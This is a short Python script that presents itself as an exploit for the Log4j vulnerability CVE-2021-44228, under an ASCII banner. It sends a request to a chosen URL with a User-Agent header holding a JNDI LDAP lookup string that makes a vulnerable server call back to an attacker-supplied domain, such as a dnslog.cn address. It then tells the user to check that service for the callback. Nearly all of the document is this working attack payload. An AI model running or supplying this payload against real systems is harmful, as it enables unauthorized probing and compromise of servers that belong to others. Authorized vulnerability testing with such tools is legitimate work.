import requests
import sys

def help():
	print("""
	  _____  _____ _______ _____        _______      ________    ___   ___ ___  __        _  _   _  _ ___  ___   ___  
	 |  __ \|_   _|__   __/ ____|      / ____\ \    / /  ____|  |__ \ / _ \__ \/_ |      | || | | || |__ \|__ \ / _ \ 
	 | |__) | | |    | | | (___ ______| |     \ \  / /| |__ ______ ) | | | | ) || |______| || |_| || |_ ) |  ) | (_) |
	 |  _  /  | |    | |  \___ \______| |      \ \/ / |  __|______/ /| | | |/ / | |______|__   _|__   _/ /  / / > _ < 
	 | | \ \ _| |_   | |  ____) |     | |____   \  /  | |____    / /_| |_| / /_ | |         | |    | |/ /_ / /_| (_) |
	 |_|  \_\_____|  |_| |_____/       \_____|   \/   |______|  |____|\___/____||_|         |_|    |_|____|____|\___/ 
	\npython3 ./CVE-2021-44228.py https://example.com xxxx.dnslog.cn\n                                                                                                                 
	""")

if (len(sys.argv)<3):
    # print ("[*] No Arguments!")
    help()
else :
    url = sys.argv[1]
    cn_domain = sys.argv[2]
    user_agent = "${jndi:ldap://" + cn_domain + "/a}"
    headers = {'User-Agent' : user_agent}
    requests.get(url , headers=headers, verify=False)
    print ("Exploit Complete. Now check dnslog.cn\n")
